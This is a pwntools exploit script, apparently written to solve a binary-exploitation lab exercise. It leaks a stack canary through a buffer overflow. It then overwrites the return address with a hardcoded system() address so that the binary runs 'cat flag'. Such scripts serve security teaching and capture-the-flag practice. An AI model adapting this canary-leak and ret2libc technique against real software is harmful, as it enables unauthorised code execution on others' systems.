#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
if args.PAUSE:
    pause()

e = ELF("exercise3b")
name = hex(e.symbols['name'])	
log.info(f"name address {name}")
#print(type(name), name)
name = b'\x60\xc0\x04\x08'			#0x804c060
system = b'\x30\xe8\x8b\x2a'		#0x2a8be830

#addr = int.from_bytes(name, byteorder='little')
#print(addr)
#addr = addr + 31					#pass the A padding 
#addr = addr.to_bytes(8,byteorder='little')


#process welcome message
i = r.recvuntil('name?\n')
log.info(f" name question {i}")		#maximum size is 0x28 so we can have a max 40-1 chars 
r.sendline('cat flag' + '\0') 	#'A'*31 + 


#fun time starts now
i = r.recvuntil("password:\n")
log.info(f" first trial prompt {i}")
exploit = 103 * 'A' + '\n'				#stack cannary is non 0 value followed by 8 0s so printf will stop printing right after cannary
r.sendline(exploit) 
#print(exploit)

i = r.recvuntil('of course ')
log.info(f"intro: {i}")
padded_cannary = r.recv(numb=108)		#recieve our exploit and the cannary value	128			
log.info(f"exploit and cannary concatinated: {padded_cannary}")		

#take the last 4 bytes out of cannary byte sequence
cannary = padded_cannary[-4:] 

exploit =  104 * b'A' + cannary + 20*b'A' + system + 4*b'A' + name + b'\n'
#append the As BUT WITHOUT /n this time in front of cannary, padding and ret addr post cannary

#process the fail and retrial
i = r.recvuntil("password\n")
log.info(f"first data {i}")
i = r.recvuntil("password:\n")
log.info(f"first data {i}")

r.sendline(exploit) 
j = r.recvall()
log.info(f"final data {j}")
